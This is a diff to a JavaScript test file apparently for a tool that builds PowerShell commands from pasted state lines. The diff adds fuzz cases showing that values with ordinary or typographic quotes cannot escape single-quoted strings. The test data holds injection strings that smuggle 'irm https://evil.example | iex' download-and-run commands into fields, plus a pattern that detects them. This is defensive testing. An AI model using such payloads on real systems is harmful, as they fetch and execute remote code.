@@ -963,12 +963,15 @@ test('settings: every value that enters a command is checked; a pasted context c
 // the settings: a crafted paste yields no command carrying more than a value, and never other code to clone.
 test('crafted paste: no field of a state line puts more than a value into a command', () => {
   const evil = "x'; irm https://evil.example | iex; '";
+  // PowerShell also opens and closes a single-quoted string with U+2018 to U+201B.
+  const curly = 'x\u2019; irm https://evil.example | iex; \u2019';
+  const literal = /['\u2018-\u201b](?:[^'\u2018-\u201b\n]|['\u2018-\u201b]{2})*['\u2018-\u201b]/g;
   const state = (o) => '<<<AVDLZ-STATE ' + JSON.stringify(Object.assign({ v: 1, counts: {}, failures: [], warnings: [] }, o)) + ' AVDLZ-STATE>>>';
   const commands = (r) => r.actions.map((a) => a.command).join('\n');
   const clean = (r, what) => {
     const all = commands(r);
     // A value inside a single-quoted PowerShell string is only a value; outside one, it would run.
-    assert.doesNotMatch(all.replace(/'(?:[^'\n]|'')*'/g, "''"), /evil|irm |iex/, what);
+    assert.doesNotMatch(all.replace(literal, "''"), /evil|irm |iex/, what);
     for (const m of all.matchAll(/git clone (\S+)/g)) assert.equal(m[1], 'https://github.com/avd-ops/avd-landing-zone.git', what + ': clone URL');
     assert.doesNotMatch(all, /git checkout -q '(?!master)/, what + ': no pasted ref');
   };
@@ -1018,9 +1021,12 @@ test('crafted paste: no field of a state line puts more than a value into a comm
   assert.match(commands(partial), /--start-vm-on-connect false/, 'a partial power object from deploy.sh is kept');
   const quoted = P.analyze(state({ stage: 'verify', status: 'failed', context: { user: "o'brien@contoso.com" }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {});
   assert.match(commands(quoted), /-UserPrincipalName 'o''brien@contoso\.com'/, 'an apostrophe in a UPN is quoted, not dropped');
+  const typographic = P.analyze(state({ stage: 'verify', status: 'failed', context: { user: "x\u2019;iex(irm('evil'))#@contoso.com" }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {});
+  assert.match(commands(typographic), /-UserPrincipalName 'x\u2019\u2019;iex\(irm\(''evil''\)\)#@contoso\.com'/, 'a typographic quote is doubled too');
+  clean(typographic, 'verify user with a typographic quote');
   // Whatever field a state line carries, and whatever a later version reads from it: every string in every
   // fixture's state line replaced by the crafted value, one at a time, must still give clean commands.
-  const evilPath = (o, path) => { const c = JSON.parse(JSON.stringify(o)); let x = c; for (const k of path.slice(0, -1)) x = x[k]; x[path[path.length - 1]] = evil; return c; };
+  const evilPath = (o, path, value) => { const c = JSON.parse(JSON.stringify(o)); let x = c; for (const k of path.slice(0, -1)) x = x[k]; x[path[path.length - 1]] = value; return c; };
   const strings = (o, path = [], out = []) => { if (typeof o === 'string') out.push(path); else if (o && typeof o === 'object') for (const k of Object.keys(o)) strings(o[k], path.concat(k), out); return out; };
   let cases = 0;
   for (const name of readdirSync(new URL('./fixtures/', import.meta.url)).filter((f) => /^state-.*\.txt$/.test(f))) {
@@ -1028,8 +1034,10 @@ test('crafted paste: no field of a state line puts more than a value into a comm
     if (!m) continue;
     const st = JSON.parse(m[1].replace(/[\r\n]+/g, ''));
     for (const path of strings(st).filter((p) => !['v', 'stage', 'status'].includes(p[0]) && p[p.length - 1] !== 'id')) {
-      clean(P.analyze(state(evilPath(st, path)), {}, { rankedRegions: ['eastus'] }), name + ' ' + path.join('.'));
-      cases++;
+      for (const value of [evil, curly]) {
+        clean(P.analyze(state(evilPath(st, path, value)), {}, { rankedRegions: ['eastus'] }), name + ' ' + path.join('.'));
+        cases++;
+      }
     }
   }
   assert.ok(cases > 100, 'fuzzed ' + cases + ' fields');
